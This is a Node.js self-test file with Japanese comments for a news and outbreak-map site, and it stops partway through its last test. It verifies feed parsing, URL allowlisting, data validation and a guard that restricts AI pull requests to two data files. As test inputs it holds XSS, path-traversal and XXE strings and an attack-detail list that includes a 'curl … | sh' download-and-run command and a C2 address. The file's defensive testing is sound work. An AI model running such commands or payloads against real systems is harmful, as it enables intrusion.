// 変換・検査処理の自己テスト（ネット接続なし）。悪意ある入力を落とせるかも確認する。
// 使い方: node scripts/test.mjs

import assert from 'node:assert/strict';
import { readFileSync, writeFileSync, mkdtempSync, cpSync, rmSync, mkdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { collectUrls } from './check-links.mjs';
import { isShownLink } from './lib/link-shown.mjs';
import { statusModel } from '../site/js/status.js';
import { checkCleanPng } from './check-privacy.mjs';
import { judge } from './scope-guard.mjs';
import { ownerExemption, SKIP_CHECKS } from './lib/owner-pr.mjs';
import { pickDaily, toItems } from './lib/animals.mjs';
import { fitCount } from './importance-rules.mjs';
import { parseFeed, parseFeedDate } from './lib/feed.mjs';
import { FEEDS, inspectFeed, normalizeFeedItem, decodeFeed, reiwaUpdatedDate } from './fetch-feeds.mjs';
import { normalizeDon } from './fetch-who-don.mjs';
import { normalizeKev, parseJpcertRdf, inspectJpcertRdf } from './fetch-security.mjs';
import { validateItems, validateChangelog, validateDirectoryDoc, validateCuratedDocs } from './validate-data.mjs';
import { applySupersede } from './lib/supersede.mjs';
import { checkNode } from './lib/node-guard.mjs';
import { parseSiteUrl } from './lib/seo.mjs';
import { isAllowedUrl, cleanText, readJson, findAttackDetail, siWithoutExplanation } from './lib/safety.mjs';
import { normalizeQuake, processQuakes, placeToCountries, inspectQuakes, quakeStatusOf } from './fetch-usgs.mjs';

const NOW = Date.parse('2026-10-25T00:00:00Z');
let n = 0;
const test = (name, fn) => {
  fn();
  n++;
  console.log('ok -', name);
};

test('WHO: 病名と国を分解し、日本語病名と国コードを付ける', () => {
  const it = normalizeDon({ Title: 'Cholera – Democratic Republic of the Congo', PublicationDate: '2026-10-20T10:00:00Z', UrlName: '2026-DON700' }, NOW);
  assert.equal(it.countries[0], 'COD');
  assert.equal(it.placeBasis, 'reported_country');
  assert.equal(it.importance, 'major');
  assert.match(it.title.ja, /^コレラ/);
  assert.equal(it.source.url, 'https://www.who.int/emergencies/disease-outbreak-news/item/2026-DON700');
});

test('WHO: 複数国の列挙と「Global」', () => {
  const a = normalizeDon({ Title: 'Mpox - Kenya, Uganda and United Republic of Tanzania', PublicationDate: '2026-09-01', UrlName: '2026-DON701' }, NOW);
  assert.deepEqual(a.countries, ['KEN', 'UGA', 'TZA']);
  assert.equal(a.importance, 'minor');
  const g = normalizeDon({ Title: 'Yellow fever – Global situation', PublicationDate: '2026-09-01', UrlName: '2026-DON702' }, NOW);
  assert.equal(g.placeBasis, 'global');
  assert.equal(g.countries.length, 0);
});

test('WHO: 一部でも国名不明なら地球儀に置かない', () => {
  const it = normalizeDon({ Title: 'Dengue – Atlantis and Peru', PublicationDate: '2026-10-01', UrlName: '2026-DON703' }, NOW);
  assert.equal(it.placeBasis, 'unknown');
  assert.equal(it.countries.length, 0);
});

test('WHO: 不正なURL断片・HTML・不可視文字・未来日・古すぎる日付を落とす/無害化する', () => {
  assert.equal(normalizeDon({ Title: 'X', PublicationDate: '2026-10-01', UrlName: '../../evil' }, NOW), null);
  assert.equal(normalizeDon({ Title: 'X', PublicationDate: '2031-01-01', UrlName: 'a-b-c' }, NOW), null);
  assert.equal(normalizeDon({ Title: 'X', PublicationDate: '2024-01-01', UrlName: 'a-b-c' }, NOW), null); // 補充の上限（2年）より古い
  const it = normalizeDon({ Title: 'Cholera‮ <img src=x onerror=alert(1)> – Peru', PublicationDate: '2026-10-01', UrlName: 'abc-1' }, NOW);
  assert.ok(!/[<>‮]/.test(it.title.original));
});

test('KEV: 補充の上限（1年）以内のみ、ランサムウェアKnownは major、場所は発表機関の所在国', () => {
  const v = { cveID: 'CVE-2026-12345', vendorProject: 'Acme', product: 'Gate', vulnerabilityName: 'Acme Gate RCE', dateAdded: '2026-10-20', knownRansomwareCampaignUse: 'Known', requiredAction: 'Apply mitigations per vendor instructions.' };
  const it = normalizeKev(v, NOW);
  assert.equal(it.importance, 'major');
  assert.equal(it.placeBasis, 'publisher_country');
  assert.deepEqual(it.countries, ['USA']);
  assert.equal(normalizeKev({ ...v, dateAdded: '2025-08-01' }, NOW), null); // 補充の上限（1年）より古い
  assert.equal(normalizeKev({ ...v, cveID: 'CVE-2026-1"><script>' }, NOW), null);
  assert.equal(normalizeKev({ ...v, requiredAction: '' }, NOW), null); // 対処方法が示されていないものは載せない
});

test('JPCERT: 注意喚起のみ抽出、DOCTYPE/ENTITY入りは拒否', () => {
  const xml = `<rdf:RDF xmlns:rdf="r"><channel rdf:about="c"><title>JPCERT</title></channel><item rdf:about="x"><title>テスト注意喚起</title><link>https://www.jpcert.or.jp/at/2026/at260099.html</link><dc:date>2026-10-20T10:00+09:00</dc:date></item>
  <item><title>週報</title><link>https://www.jpcert.or.jp/wr/2026/wr264001.html</link><dc:date>2026-10-20T10:00+09:00</dc:date></item>
  <item><title>偽</title><link>https://evil.example/at/x</link><dc:date>2026-10-20T10:00+09:00</dc:date></item></rdf:RDF>`;
  const items = parseJpcertRdf(xml, NOW);
  assert.equal(items.length, 1);
  assert.equal(items[0].countries[0], 'JPN');
  assert.throws(() => parseJpcertRdf('<!DOCTYPE x [<!ENTITY a "b">]><rdf:RDF/>', NOW));
});

test('URL許可リスト: http・javascript・偽装ホスト・認証情報入りを拒否', () => {
  assert.ok(isAllowedUrl('https://www.who.int/x'));
  assert.ok(!isAllowedUrl('http://www.who.int/x'));
  assert.ok(!isAllowedUrl('javascript:alert(1)'));
  assert.ok(!isAllowedUrl('https://who.int.evil.example/x'));
  assert.ok(!isAllowedUrl('https://evilwho.int/x'));
  assert.ok(!isAllowedUrl('https://user:pass@www.who.int/')); // 認証情報入りURLを拒否するテスト用の架空の値（check-privacy.mjs の ALLOW に登録済み）
  assert.ok(!isAllowedUrl('https://www.who.int:8443/'));
});

test('手動データ: 断定表現・HTML・出典主語なしの福祉・確認日なしを拒否', () => {
  const base = { id: 'welfare-1', layer: 'welfare', title: { ja: 'A国の制度' }, summary: { ja: 'この制度で貧困は必ず効く' }, countries: ['SWE'], placeBasis: 'reported_country', importance: 'minor', publishedAt: '2026-01-01', checkedAt: '2026-10-01', source: { name: 'OECD', url: 'https://www.oecd.org/' }, sourceType: 'intl_org' };
  const errs = validateItems([base], { layer: 'welfare', curated: true });
  assert.ok(errs.some((e) => e.includes('必ず')));
  assert.ok(errs.some((e) => e.includes('attribution')));
  const errs2 = validateItems([{ ...base, summary: { ja: '<b>x</b>' }, attribution: { ja: 'OECDによれば' }, checkedAt: undefined }], { layer: 'welfare', curated: true });
  assert.ok(errs2.some((e) => e.includes('HTML')));
  assert.ok(errs2.some((e) => e.includes('checkedAt')));
});

const good = { id: 'research-1', layer: 'research', title: { ja: '研究の見出し', en: 'Study headline' }, summary: { ja: '対象者で変化が報告された', en: 'A change was reported in participants' }, countries: ['JPN'], placeBasis: 'reported_country', importance: 'minor', publishedAt: '2026-01-01', checkedAt: '2026-10-01', source: { name: 'Nature', url: 'https://www.nature.com/articles/x' }, sourceType: 'peer_reviewed' };
const errsOf = (patch) => validateItems([{ ...good, ...patch }], { layer: 'research', curated: true });
const sum = (ja) => ({ summary: { ja, en: 'A change was reported in participants' } });
const phraseErr = (errs) => errs.some((e) => e.includes('断定・誇大'));

test('手動データ: 正しい項目は通る', () => {
  assert.deepEqual(errsOf({}), []);
});

test('手動データ: ゼロ幅文字・全角・別項目での断定表現のすり抜けを拒否', () => {
  assert.ok(phraseErr(errsOf(sum('これで治\u200Bる'))));
  assert.ok(phraseErr(errsOf(sum('効果は１００％'))));
  assert.ok(phraseErr(errsOf(sum('根治が期待'))));
  for (const bad of ['これで治ります', '症状が治った', 'よく効きます', '効果がある', '副作用はない', '百パーセント', 'It cures 100 percent'])
    assert.ok(phraseErr(errsOf(sum(bad))), bad);
  assert.deepEqual(errsOf(sum('つらいときは必ず相談窓口へ。確実な情報は原典で。')), []);
  assert.ok(errsOf({ tags: ['必ず効く'] }).some((e) => e.includes('tags')));
  assert.ok(phraseErr(errsOf({ links: [{ label: '特効薬の情報', url: 'https://www.nature.com/x' }] })));
});

test('手動データ: 双方向制御文字・未定義の項目名・不正な形を拒否', () => {
  assert.ok(errsOf({ title: { ja: 'abc\u202Eevil' } }).some((e) => e.includes('見えない文字')));
  assert.ok(errsOf({ onclick: 'x' }).some((e) => e.includes('定義されていない')));
  assert.ok(errsOf({ summary: { ja: 'a', fr: 'b' } }).some((e) => e.includes('使えないキー')));
  assert.ok(errsOf({ links: { label: 'a', url: 'https://www.nature.com/' } }).some((e) => e.includes('links は配列')));
  assert.ok(errsOf({ links: 'https://www.nature.com/' }).length > 0);
  assert.ok(errsOf({ placeBasis: 'global' }).some((e) => e.includes('countries を空')));
  assert.ok(errsOf({ id: 'welfare-9' }).some((e) => e.includes('research-')));
  assert.ok(errsOf({ publishedAt: '2026-02-30' }).some((e) => e.includes('publishedAt')));
});

test('URL許可リスト: ホスト完全一致とパス規則', () => {
  assert.ok(isAllowedUrl('https://doi.org/10.1038/s41586-026-00001-1'));
  assert.ok(!isAllowedUrl('https://doi.org/not-a-doi'));
  assert.ok(isAllowedUrl('https://pubmed.ncbi.nlm.nih.gov/12345678/'));
  assert.ok(!isAllowedUrl('https://evil.nih.gov/x'));
  assert.ok(!isAllowedUrl('https://blog.nature.com/x'));
  assert.ok(!isAllowedUrl('https://nvd.nist.gov/other'));
  assert.ok(isAllowedUrl('https://nvd.nist.gov/vuln/detail/CVE-2026-12345'));
});

test('JPCERT: パスを正規化してから注意喚起か判定する', () => {
  const xml = `<rdf:RDF><channel/><item><title>x</title><link>https://www.jpcert.or.jp/at/../wr/at/</link><dc:date>2026-10-20T10:00+09:00</dc:date></item></rdf:RDF>`;
  assert.equal(parseJpcertRdf(xml, NOW).length, 0);
});

test('手動データ: 英語の見出し・要約が無ければ拒否', () => {
  assert.ok(errsOf({ title: { ja: '見出しのみ' } }).some((e) => e.includes('title.en')));
  assert.ok(errsOf({ summary: { ja: '日本語のみ' } }).some((e) => e.includes('summary.en')));
});

test('英語の断定表現も拒否', () => {
  assert.ok(errsOf({ summary: { ja: '変化が報告された', en: 'A miracle cure with no side effects' } }).length > 0);
});

test('更新履歴: 記録の無い項目・個人名らしき作業者名を拒否', () => {
  const ok = { schemaVersion: 1, entries: [{ date: '2026-10-01', by: 'ai-curator', summary: { ja: '追加', en: 'Added' }, ids: ['research-1'] }] };
  assert.deepEqual(validateChangelog(ok, ['research-1'], 'log'), []);
  assert.ok(validateChangelog(ok, ['research-2'], 'log').some((e) => e.includes('research-2')));
  const bad = { schemaVersion: 1, entries: [{ date: '2026-10-01', by: 'Taro Yamada', summary: { ja: 'a', en: 'a' }, ids: [] }] };
  assert.ok(validateChangelog(bad, [], 'log').some((e) => e.includes('by')));
});

test('以前の情報: 同じ地域・話題の古い情報は7日間だけ「以前の情報」として残す', () => {
  const mk = (id, d) => ({ id, layer: 'outbreak', topic: 'cholera', countries: ['COD'], publishedAt: d, importance: 'major' });
  const out = applySupersede([mk('a', '2026-10-24'), mk('b', '2026-10-20'), mk('c', '2026-10-10')], NOW);
  assert.deepEqual(out.map((x) => [x.id, !!x.superseded]), [['a', false], ['b', true]]);
  assert.equal(out[1].importance, 'minor');
  assert.equal(out[1].supersededBy, 'a');
});

test('監査指摘への対策：すり抜け・偽装・未来日・許可外DOIを拒否', () => {
  assert.ok(phraseErr(errsOf(sum('治\u2800る'))));
  assert.ok(errsOf({ summary: { ja: '変化が報告された', en: 'A \u0441ure was reported' } }).some((e) => e.includes('混在')));
  for (const bad of ['治癒した', 'なおる', '必ずよくなる', '効果的な治療'])
    assert.ok(phraseErr(errsOf(sum(bad))), bad);
  for (const bad of ['curing the disease', 'a miraculous result', 'without side effects', 'one hundred percent', 'proven to work'])
    assert.ok(phraseErr(errsOf({ summary: { ja: '変化が報告された', en: bad } })), bad);
  assert.deepEqual(errsOf({ summary: { ja: '変化が報告された', en: 'Secure procurement of vaccines was reported' } }), []);
  assert.ok(errsOf({ publishedAt: '2099-01-01' }).some((e) => e.includes('publishedAt')));
  assert.ok(errsOf({ source: { name: 'Nature', url: 'https://www.nature.com/articles/x?utm=1' } }).some((e) => e.includes('source.url')));
  assert.ok(!isAllowedUrl('https://doi.org/10.5281/zenodo.123'));
  assert.ok(isAllowedUrl('https://doi.org/10.1056/NEJMoa2026001'));
  const log = { schemaVersion: 1, entries: [{ date: '2026-10-01', by: 'ai-yamada', summary: { ja: 'a', en: 'a' }, ids: [] }] };
  assert.ok(validateChangelog(log, [], 'log').some((e) => e.includes('by')));
});

test('日本語と英語の画面文言のキーが一致している', () => {
  const ja = readJson('site/i18n/ja.json');
  const en = readJson('site/i18n/en.json');
  assert.deepEqual(Object.keys(ja).sort(), Object.keys(en).sort());
  for (const [k, v] of Object.entries(en)) assert.ok(v.trim(), `en.${k} が空`);
});

test('相談先リンク集：許可外のURL・ひらがな欄の漢字・分類なし・偽装文字を拒否する', () => {
  const base = readJson('data/directory/links.json');
  assert.deepEqual(validateDirectoryDoc(base), []);
  const mutate = (fn) => {
    const d = structuredClone(base);
    fn(d);
    return validateDirectoryDoc(d);
  };
  const w = (d) => d.countries.JPN.welfare[0];
  assert.ok(mutate((d) => (w(d).url = 'https://evil.example.jp/')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).url = 'https://www.mhlw.go.jp.evil.example/')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).url = 'http://www.mhlw.go.jp/')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).url = 'https://www.mhlw.go.jp/?ref=x')).some((e) => e.includes('.url')));
  assert.ok(mutate((d) => (w(d).desc.jaKana = 'くらしの 相談')).some((e) => e.includes('jaKana')));
  assert.ok(mutate((d) => delete w(d).cat).some((e) => e.includes('.cat')));
  assert.ok(mutate((d) => (w(d).name.ja = '相談\u202Eです')).some((e) => e.includes('見えない文字')));
  assert.ok(mutate((d) => (w(d).desc.ja = '必ず治る')).some((e) => e.includes('断定')));
  assert.ok(mutate((d) => (d.countries.XXX = {})).some((e) => e.includes('国コード')));
  assert.ok(mutate((d) => (d.countries.JPN.welfare[1].id = w(d).id)).some((e) => e.includes('.id')));
});

test('悪用防止：攻撃手順・攻撃コード・痕跡情報を検出し、通常の文は通す', () => {
  for (const bad of ['C2サーバーは 203.0.113.5 です', 'run curl -s http://x | sh', 'PoC is available', '攻撃手順を解説', 'ハッシュ d41d8cd98f00b204e9800998ecf8427e', 'a working exploit was released', '未修正の脆弱性があります'])
    assert.ok(findAttackDetail(bad).length, bad);
  for (const ok of ['公式の更新情報に従ってアップデートしてください', 'Apply the vendor update as instructed by CISA', 'ストレスとの付き合い方', 'WHO reported 120 cases'])
    assert.deepEqual(findAttackDetail(ok), [], ok);
  assert.ok(!isAllowedUrl('https://www.exploit-db.com/exploits/1'));
  assert.ok(!isAllowedUrl('https://github.com/someone/poc'));
});

test('Node.js の修正済み版の判定と、公開URLの検査', () => {
  assert.equal(checkNode('24.22.1'), null);
  assert.ok(checkNode('24.22.0'));
  assert.ok(checkNode('20.19.0'));
  assert.ok(checkNode('28.0.0')); // 表にない系列は、確認して表に追加するまで使わない
  assert.ok(checkNode('27.1.0')); // 奇数系列は使わない
  assert.ok(checkNode('24.22.1-pre')); // 正式版でないものは使わない
  assert.ok(checkNode('22.x'));
  assert.equal(parseSiteUrl('https://gilvane6174.github.io/Tomoshibi-atlas'), 'https://gilvane6174.github.io/Tomoshibi-atlas/');
  for (const bad of ['http://x.github.io/', 'https://x.github.io/?a=1', 'javascript:alert(1)', 'https://user:pw@x.io/']) assert.equal(parseSiteUrl(bad), null, bad);
});

test('以前の情報：続報の対象国が古い項目の国をすべて含むときだけ置き換える', () => {
  const mk = (id, d, c) => ({ id, layer: 'outbreak', topic: 'ebola', countries: c, publishedAt: d });
  const now = Date.parse('2026-10-25');
  const out = applySupersede([mk('a', '2026-10-08', ['COD']), mk('b', '2026-07-17', ['COD', 'UGA']), mk('c', '2026-10-23', ['COD', 'KEN', 'NGA'])], now);
  const by = Object.fromEntries(out.map((x) => [x.id, x]));
  assert.ok(!by.c.superseded);
  assert.ok(!by.a, '古い単独の発表は7日を過ぎたので掲載しない');
  assert.ok(by.b && !by.b.superseded, 'UGA は続報に含まれないので残す');
});

test('不可視文字の除去', () => {
  assert.equal(cleanText('a​b\u0000c', 10), 'a b c');
});

test('地図データ：外周は時計回り・穴は反時計回り（逆向きだと地球全体を覆い、現在地の判定が狂う）', () => {
  const geo = readJson('site/data/geo/countries-110m.json');
  const sa = (r) => r.slice(0, -1).reduce((a, p, i) => a + p[0] * r[i + 1][1] - r[i + 1][0] * p[1], 0);
  for (const f of geo.features)
    for (const poly of f.geometry.type === 'Polygon' ? [f.geometry.coordinates] : f.geometry.coordinates) {
      assert.ok(sa(poly[0]) < 0, `${f.id} の外周の向き`);
      for (const h of poly.slice(1)) assert.ok(sa(h) > 0, `${f.id} の穴の向き`);
    }
  const ids = new Set(readJson('site/data/geo/country-index.json').map((c) => c.id));
  for (const f of geo.features) assert.ok(ids.has(f.id), `${f.id} が索引にある`);
});

test('共有画像：付帯情報なし・構造が正しいPNGだけを通す', () => {
  const png = readFileSync(new URL('../site/og-image.png', import.meta.url));
  assert.equal(checkCleanPng(png), null);
  assert.ok(checkCleanPng(Buffer.concat([png, Buffer.from('extra')])));
  assert.ok(checkCleanPng(png.subarray(0, png.length - 12)));
});

test('変更範囲の検査（scope-guard）：AI・外部の PR は data/curated の2ファイルの変更だけ', () => {
  const base = { owner: 'op', repo: 'op/site', headRepo: 'ai/site', headRef: 'curated/x', author: 'ai-bot' };
  const m = (filename, status = 'modified') => ({ filename, status });
  assert.deepEqual(judge({ ...base, files: [m('data/curated/entries.json'), m('data/curated/changelog.json')] }), []);
  assert.ok(judge({ ...base, files: [m('data/curated/entries.json'), m('.github/workflows/validate.yml')] }).length);
  assert.ok(judge({ ...base, files: [m('scripts/check-pr-scope.mjs')] }).length);
  assert.ok(judge({ ...base, files: [m('data/curated/new.json', 'added')] }).length);
  assert.ok(judge({ ...base, files: [m('data/curated/entries.json', 'removed')] }).length);
  assert.ok(judge({ ...base, files: [{ filename: 'data/curated/entries.json', status: 'renamed', previous_filename: 'x' }] }).length);
  // 運用者になりすました curated/ ブランチ・別リポジトリからの PR は運用者扱いしない
  assert.ok(judge({ ...base, author: 'op', files: [m('scripts/a.mjs')] }).length);
  assert.ok(judge({ ...base, author: 'op', headRef: 'fix', files: [m('scripts/a.mjs')] }).length);
  // 運用者の PR と認めるのは、GitHub App を通さずに作られたと確かめられたとき（performed_via_github_app が null）だけ
  const own = { ...base, author: 'op', headRepo: 'op/site', headRef: 'fix', files: [m('scripts/a.mjs')], mode: 'verified-null' };
  assert.deepEqual(judge({ ...own, viaApp: null }), []);
  assert.ok(judge({ ...own, viaApp: null, mode: undefined }).length); // 実機で確かめるまで（OWNER_PR_CHECK 未設定）は、null でも制限する
  assert.ok(judge({ ...own, viaApp: null, mode: 'yes' }).length);
  assert.ok(judge({ ...own, viaApp: { slug: 'claude' } }).length); // 運用者の名義でも、アプリ経由なら制限する
  assert.ok(judge({ ...own }).length); // 確かめられない（取得失敗・項目なし）なら制限する
  assert.ok(judge({ ...own, viaApp: 'x' }).length); // 想定外の形も制限する
  assert.ok(judge({ ...own, viaApp: null, headRef: 'curated/x' }).length);
  assert.ok(judge({ ...own, viaApp: null, headRepo: 'someone/site' }).length); // フォーク
  assert.ok(judge({ ...own, viaApp: null, author: 'someone' }).length); // 別の人
  assert.equal(ownerExemption({ author: 'op', owner: 'op', repo: 'op/site', headRepo: 'op/site', headRef: 'fix', viaApp: null, mode: 'verified-null' }).exempt, true);
  assert.equal(ownerExemption({ author: 'op', owner: 'op', repo: 'op/site', headRepo: 'op/site', headRef: 'fix', viaApp: null }).exempt, false);
  assert.equal(ownerExemption({ author: 'op', owner: 'op', repo: 'op/site', headRepo: 'op/site', headRef: 'fix', viaApp: undefined }).exempt, false);
  assert.deepEqual(judge({ ...base, author: 'dependabot[bot]', files: [m('.github/workflows/deploy.yml')] }), []);
  assert.ok(judge({ ...base, author: 'dependabot[bot]', files: [m('scripts/a.mjs')] }).length);
  assert.ok(judge({ ...base, owner: '', files: [m('data/curated/entries.json')] }).length);
});

test('今日の動物たち：日付だけで決まり、国が重ならず、日によって入れ替わる', () => {
  const facts = readJson('data/curated/animals.json').facts;
  const a = pickDaily(facts, '2026-10-26');
  assert.deepEqual(a.map((f) => f.id), pickDaily(facts, '2026-10-26').map((f) => f.id));
  assert.equal(a.length, 20);
  assert.equal(new Set(a.map((f) => f.country)).size, a.length);
  assert.notDeepEqual(a.map((f) => f.id), pickDaily(facts, '2026-10-27').map((f) => f.id));
  const items = toItems(a, '2026-10-26');
  assert.ok(items.every((it) => it.layer === 'animals' && it.countries.length === 1 && it.publishedAt === '2026-10-26'));
});

test('表示件数：掲載期間内を最大50件、足りなければ古い情報を小さく補って20件にそろえる', () => {
  const now = Date.parse('2026-10-26T00:00:00Z');
  const day = (n) => new Date(now - n * 86400000).toISOString().slice(0, 10);
  const mk = (n, extra = {}) => ({ id: 'x' + n, layer: 'outbreak', importance: 'major', publishedAt: day(n), ...extra });
  // 期間内5件・期間外30件 → 20件（期間外の15件は小さな文字・older）
  const few = fitCount([...Array.from({ length: 5 }, (_, i) => mk(i)), ...Array.from({ length: 30 }, (_, i) => mk(200 + i))], 120, now);
  assert.equal(few.length, 20);
  assert.equal(few.filter((x) => x.older).length, 15);
  assert.ok(few.filter((x) => x.older).every((x) => x.importance === 'minor'));
  assert.ok(few.slice(0, 5).every((x) => !x.older && x.importance === 'major'));
  // 期間内60件 → 新しい順に50件
  const many = fitCount(Array.from({ length: 60 }, (_, i) => mk(i)), 120, now);
  assert.equal(many.length, 50);
  assert.equal(many[49].id, 'x49');
  // 以前の情報は、置き換えた情報が表示されているときだけ残る
  const sup = fitCount([mk(1), mk(2, { superseded: true, supersededBy: 'x1' }), mk(3, { superseded: true, supersededBy: 'gone' })], 120, now);
  assert.deepEqual(sup.map((x) => x.id), ['x1', 'x2']);
  // 補う古さの上限（fillDays）：防犯・防災などで古すぎる情報を補わない
  const capped = fitCount([mk(1), mk(100), mk(170), mk(400)], 90, now, 50, 180);
  assert.deepEqual(capped.map((x) => x.id), ['x1', 'x100', 'x170']);
  // 手動掲載（期間なし）は、新しい順に50件まで
  assert.equal(fitCount(Array.from({ length: 60 }, (_, i) => mk(i * 50)), null, now).length, 50);
});

test('SI（Super Intelligence）：説明のない「SI」は拒否し、SI の情報には ai の印を求める', () => {
  const base = { id: 'research-2026-si-test', layer: 'research', title: { ja: '米国のSI指針', en: 'US SI guidance' }, summary: { ja: 'a', en: 'b' }, tags: ['policy'], topic: 'si-test', countries: ['USA'], placeBasis: 'reported_country', importance: 'minor', publishedAt: '2026-10-01', checkedAt: '2026-10-26', source: { name: 'x', url: 'https://www.who.int/news' }, sourceType: 'public_agency' };
  assert.ok(validateItems([base], { curated: true }).some((e) => e.includes('「SI」だけでは')));
  const ok = { ...base, title: { ja: '米国のSI（Super Intelligence。米国政府の文書でのAIの呼び方）指針', en: 'US Super Intelligence (SI) guidance' } };
  assert.ok(validateItems([ok], { curated: true }).some((e) => e.includes('tags に ai')));
  assert.ok(!validateItems([{ ...ok, tags: ['policy', 'ai'] }], { curated: true }).some((e) => /SI|ai を付ける/.test(e)));
  assert.ok(!siWithoutExplanation('SI-CERT（スロベニア）'));
  assert.ok(siWithoutExplanation('SI units'));
  assert.ok(siWithoutExplanation('米国のＳＩ指針')); // 全角も検出
});

test('USGS 地震：M5.5以上・正しい形だけ、国は場所の表記の最後で決め、分からなければ置かない', () => {
  const f = (o = {}, p = {}) => ({ type: 'Feature', id: 'us7000abcd', properties: { type: 'earthquake', mag: 6.2, place: '37 km SW of Hualien City, Taiwan', time: Date.parse('2026-10-24T03:00:00Z'), ...p }, ...o });
  const it = normalizeQuake(f(), NOW);
  assert.equal(it.layer, 'quake');
  assert.deepEqual(it.countries, ['TWN']);
  assert.equal(it.importance, 'major');
  assert.equal(it.source.url, 'https://earthquake.usgs.gov/earthquakes/eventpage/us7000abcd');
  assert.ok(isAllowedUrl(it.source.url));
  assert.equal(normalizeQuake(f({}, { mag: 5.0 }), NOW), null);
  assert.throws(() => normalizeQuake(f({ id: '../x' }), NOW)); // 形の異常は例外（inspectQuakes が異常として数える）
  assert.equal(normalizeQuake(f({}, { type: 'quarry blast' }), NOW), null);
  assert.equal(normalizeQuake(f({}, { time: Date.parse('2026-08-01T00:00:00Z') }), NOW), null); // 30日より前
  assert.deepEqual(normalizeQuake(f({}, { place: 'south of the Fiji Islands' }), NOW).countries, []);
  assert.deepEqual(placeToCountries('100 km S of Sand Point, Alaska'), ['USA']);
  // 北方領土・千島列島などは、USGS が Russia と書いても地球儀には置かない（日本の一般的な地図の表し方に合わせる）
  assert.deepEqual(placeToCountries("100 km SE of Kuril'sk, Russia"), []);
  assert.deepEqual(placeToCountries('50 km E of Shikotan, Russia'), []);
  assert.deepEqual(placeToCountries('20 km N of Tbilisi, Georgia'), []);
  assert.deepEqual(placeToCountries('10 km W of Ridgecrest, CA'), ['USA']);
  assert.ok(!/[<>]/.test(normalizeQuake(f({}, { place: '<img src=x> 10 km N of X, Japan' }), NOW).title.ja));
  assert.throws(() => processQuakes({ type: 'x' }, NOW));
});

test('USGS 地震：範囲外の時刻（1e20 など）の項目だけを除き、正常な項目は残す。取得状態は最後の検査の後で決める', () => {
  const ok = { type: 'Feature', id: 'us7000good', properties: { type: 'earthquake', mag: 6.0, place: '10 km N of X, Japan', time: Date.parse('2026-10-24T00:00:00Z') } };
  const bad = (time, id) => ({ type: 'Feature', id, properties: { type: 'earthquake', mag: 6.0, place: 'x, Japan', time } });
  const got = inspectQuakes({ type: 'FeatureCollection', features: [ok, bad(1e20, 'us7000bad1'), bad(-1e20, 'us7000bad2'), bad('2026', 'us7000bad3'), null] }, NOW);
  assert.deepEqual(got.items.map((x) => x.id), ['usgs-us7000good']);
  assert.equal(got.raw, 5);
  assert.throws(() => normalizeQuake(bad(1e20, 'us7000bad1'), NOW));
  assert.equal(got.errors, 4);
  assert.equal(quakeStatusOf({ raw: 5, normalized: 1, errors: 0, valid: 1 }), 'ok');
  assert.equal(quakeStatusOf({ raw: 0, normalized: 0, errors: 0, valid: 0 }), 'empty');
  assert.equal(quakeStatusOf({ raw: 40, normalized: 0, errors: 0, valid: 0 }), 'empty'); // M5.5未満だけ＝正常な0件
  assert.equal(quakeStatusOf({ raw: 3, normalized: 0, errors: 3, valid: 0 }), 'invalid'); // 全件が例外
  assert.equal(quakeStatusOf({ raw: 3, normalized: 2, errors: 0, valid: 0 }), 'invalid'); // 変換できても最後の検査で全件不合格
});

test('RSS/Atom：見出し・リンク・日付だけを読み、DOCTYPE/ENTITY を拒否。項目の異常はその項目だけ除く', () => {
  const rss = `<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel><title>x</title>
    <item><title><![CDATA[New scam &amp; fraud advice]]></title><link>https://www.ncsc.gov.uk/news/scam-advice</link><pubDate>Fri, 23 Oct 2026 09:00:00 GMT</pubDate><description>body not read</description></item>
    <item><title>Evil</title><link>https://evil.example/x</link><pubDate>Fri, 23 Oct 2026 09:00:00 GMT</pubDate></item>
    <item><title>No date</title><link>https://www.ncsc.gov.uk/news/a</link></item>
    <item><title>Old</title><link>https://www.ncsc.gov.uk/news/old</link><pubDate>Fri, 01 Jan 2021 09:00:00 GMT</pubDate></item>
  </channel></rss>`;
  const ncsc = FEEDS.find((f) => f.key === 'ncscNews');
  const got = inspectFeed(ncsc, rss, NOW);
  assert.equal(got.raw, 4);
  assert.equal(got.items.length, 1);
  assert.equal(got.errors, 2); // 別ホストのリンク・日付なし
  const it = got.items[0];
  assert.equal(it.title.en, 'New scam & fraud advice');
  assert.equal(it.title.ja, undefined); // 機械翻訳しない
  assert.deepEqual(it.countries, ['GBR']);
  assert.equal(it.layer, 'crime');
  assert.deepEqual(validateItems([it], { layer: 'crime', curated: false }), []);
  assert.throws(() => parseFeed('<!DOCTYPE x [<!ENTITY a "b">]><rss><item><title>&a;</title></item></rss>'));
  assert.throws(() => parseFeed('<html><body>not a feed</body></html>'));
  // Atom と RSS 1.0
  const atom = '<feed xmlns="http://www.w3.org/2005/Atom"><entry><title>T</title><link rel="alternate" href="https://www.ncsc.gov.uk/news/t"/><updated>2026-10-20T00:00:00Z</updated></entry></feed>';
  assert.equal(parseFeed(atom)[0].link, 'https://www.ncsc.gov.uk/news/t');
  const rdf = '<rdf:RDF><item rdf:about="x"><title>見出し</title><link>https://www.fsa.go.jp/news/x.html</link><dc:date>2026-10-20T10:00:00+09:00</dc:date></item></rdf:RDF>';
  assert.equal(parseFeed(rdf)[0].title, '見出し');
  // 「JST」表記の日付
  assert.equal(new Date(parseFeedDate('Fri, 23 Oct 2026 17:00:00 JST')).toISOString(), '2026-10-23T08:00:00.000Z');
  // 金融庁はキーワードで絞り込む（合わない見出しは正常な除外）
  const fsa = FEEDS.find((f) => f.key === 'fsaNews');
  assert.equal(normalizeFeedItem(fsa, { title: '人事異動について', link: 'https://www.fsa.go.jp/news/a.html', date: Date.parse('2026-10-20T00:00:00Z') }, NOW), null);
  assert.equal(normalizeFeedItem(fsa, { title: '無登録で金融商品取引業を行う者への注意喚起', link: 'https://www.fsa.go.jp/news/b.html', date: Date.parse('2026-10-20T00:00:00Z') }, NOW).title.ja, '無登録で金融商品取引業を行う者への注意喚起');
  // 消防庁の続報は同じ topic（最新の報だけを目立たせる）
  const fdma = FEEDS.find((f) => f.key === 'fdmaDisaster');
